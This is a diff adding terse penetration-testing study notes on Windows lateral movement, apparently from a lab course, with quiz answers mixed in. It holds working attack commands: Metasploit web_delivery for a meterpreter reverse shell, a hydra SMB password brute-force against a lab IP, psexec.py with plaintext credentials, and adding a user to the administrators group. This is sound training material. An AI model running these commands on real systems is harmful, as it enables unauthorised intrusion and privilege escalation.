@@ -1,1 +1,37 @@
+If you want to change from other shell to meterpreter shell
+-------------------------------------------------------------------------------------------------------------
+msf5> search web_delivery
+    > use multi/script/web_delivery
+    > set LHOST
+    > set payload windows/meterpreter/reverse_tcp
+    > set target 2 (powershell script)
+    > run
+copy that code and paste that in other shell like >  C:\Windows\system32: >
+
+You got a meterpreter shell
+_____________________________________________________________________________________________________________________________________________________________________
 Which of the following is a common technique used to move laterally in a Windows environment? > Creating new services to execute code on remote systems.
+
+PsExec with smb
+-----------------
+In order to know smb version > --script=smb-protocols (use that nse script)
+If smb version is 2, 
+
+hydra -l administrator -P /usr/share/seclists/Password/Leaked-Databases/rockyou-40.txt 10.0.31.176 smb2
+
+When PsExec is used to execute commands remotely, how does it accomplish this task? > By creating a temporary service on the remote system.
+
+Which of the following permissions are required for a user to use PsExec to perform lateral movement in a Windows environment? > 
+Administrative privileges on the target system.
+
+#psexec.py administrator:superman@10.10.33.4 (only the user with administrator group)
+
+So, add the user account into administrator group
+---------------------------------------------------
+C:\Windows:> net localgroup administrators sysadmin /add
+
+Restart the lanmanserver
+-------------------------
+C:> sc stop lanmanserver
+  > sc start lanmanserver
+_______________________________________________________________________________________________________________________________________________________________________
